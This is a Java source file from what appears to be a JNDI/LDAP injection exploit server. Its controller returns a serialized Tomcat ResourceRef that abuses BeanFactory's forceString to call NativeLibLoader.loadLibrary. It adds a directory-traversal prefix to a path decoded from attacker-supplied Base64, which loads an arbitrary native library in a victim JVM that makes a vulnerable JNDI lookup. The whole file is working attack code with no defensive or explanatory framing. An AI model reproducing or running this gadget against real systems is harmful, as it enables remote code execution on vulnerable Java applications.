package com.example.exploit.controller;

import com.example.exploit.annotation.LdapController;
import com.example.exploit.annotation.LdapMapping;
import com.example.exploit.util.SerializeUtil;
import com.unboundid.ldap.sdk.Entry;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.util.Base64;
import java.util.Hashtable;

@LdapController
@LdapMapping("/NativeLibLoader")
public class NativeLibLoaderController {
    public void processResult(Hashtable<String, String> params, Entry e) throws Exception {
        ResourceRef ref = new ResourceRef("com.sun.glass.utils.NativeLibLoader", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=loadLibrary"));
        ref.add(new StringRefAddr("a", "/../../../../../../../../../../../../" + params.get("path")));

        System.out.println("[LDAP] Using NativeLibLoader");
        e.addAttribute("javaClassName", "foo");
        e.addAttribute("javaSerializedData", SerializeUtil.serialize(ref));
    }

    @LdapMapping("/{path}")
    public void load(Hashtable<String, String> params) {
        String path = new String(Base64.getUrlDecoder().decode(params.get("path")));
        params.replace("path", path);
        System.out.println("[LDAP] Native Library Path: " + path);
    }
}
